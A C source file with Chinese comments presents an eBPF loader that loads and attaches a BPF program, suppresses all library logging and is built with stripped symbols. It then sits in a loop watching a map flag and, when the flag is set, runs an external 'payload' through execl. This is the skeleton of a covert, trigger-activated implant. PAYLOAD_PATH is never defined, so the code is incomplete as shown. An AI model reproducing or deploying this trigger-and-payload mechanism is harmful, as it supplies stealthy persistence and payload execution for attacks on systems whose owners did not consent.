/*
 * eBPF Loader - 从第一性原理实现
 *
 * 功能：
 * 1. 加载 eBPF 程序到内核
 * 2. 附加到 tracepoint/kprobe
 * 3. 与用户空间通信（BPF maps）
 *
 * 编译: gcc -O2 -Wall -s ebpf_loader.c -o ebpf_loader -lbpf -lelf
 *
 * 需要: libbpf-dev, libelf-dev, clang, llvm
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/resource.h>
#include <bpf/libbpf.h>
#include <bpf/bpf.h>

static int libbpf_print_fn(enum libbpf_print_level level, const char *format, va_list args) {
    return 0;  // 抑制所有输出
}

/*
 * 从 ELF 文件加载 eBPF 程序
 */
int load_bpf_program(const char* elf_path, const char* prog_name) {
    struct bpf_object* obj = NULL;
    struct bpf_program* prog = NULL;
    int prog_fd = -1;
    int ret = -1;

    // 设置日志回调
    libbpf_set_print(libbpf_print_fn);

    // 打开 BPF 对象文件
    obj = bpf_object__open_file(elf_path, NULL);
    if (!obj) {
        fprintf(stderr, "[-] Failed to open BPF object: %s\n", strerror(errno));
        return -1;
    }

    // 查找程序
    prog = bpf_object__find_program_by_name(obj, prog_name);
    if (!prog) {
        fprintf(stderr, "[-] Program '%s' not found\n", prog_name);
        goto cleanup;
    }

    // 加载 BPF 程序
    ret = bpf_object__load(obj);
    if (ret) {
        fprintf(stderr, "[-] Failed to load BPF program: %d\n", ret);
        goto cleanup;
    }

    // 获取程序文件描述符
    prog_fd = bpf_program__fd(prog);
    if (prog_fd < 0) {
        fprintf(stderr, "[-] Failed to get program fd\n");
        goto cleanup;
    }

    printf("[+] BPF program '%s' loaded (fd=%d)\n", prog_name, prog_fd);

    // 附加到 tracepoint
    // 实际使用时需要指定具体的 attach 目标
    struct bpf_link* link = bpf_program__attach(prog);
    if (!link) {
        fprintf(stderr, "[-] Failed to attach program\n");
        ret = -1;
        goto cleanup;
    }

    printf("[+] BPF program attached\n");

    // 保持运行
    while (1) {
        sleep(60);

        // 检查 BPF map 中的触发标志
        int map_fd = bpf_object__find_map_fd_by_name(obj, "monitored_processes");
        if (map_fd >= 0) {
            __u32 key = 0;
            __u32 value = 0;
            if (bpf_map_lookup_elem(map_fd, &key, &value) == 0 && value == 1) {
                printf("[!] Trigger detected, launching payload...\n");
                // 重置标志
                value = 0;
                bpf_map_update_elem(map_fd, &key, &value, BPF_ANY);

                // 执行 payload
                execl(PAYLOAD_PATH, PAYLOAD_PATH, NULL);
            }
        }
    }

    ret = 0;

cleanup:
    if (obj) bpf_object__close(obj);
    return ret;
}

int main(int argc, char* argv[]) {
    if (argc < 3) {
        fprintf(stderr, "Usage: %s <bpf_object.o> <program_name>\n", argv[0]);
        return 1;
    }

    // 提高 rlimit
    struct rlimit rlim = {RLIM_INFINITY, RLIM_INFINITY};
    if (setrlimit(RLIMIT_MEMLOCK, &rlim)) {
        fprintf(stderr, "[-] setrlimit failed: %s\n", strerror(errno));
    }

    return load_bpf_program(argv[1], argv[2]);
}
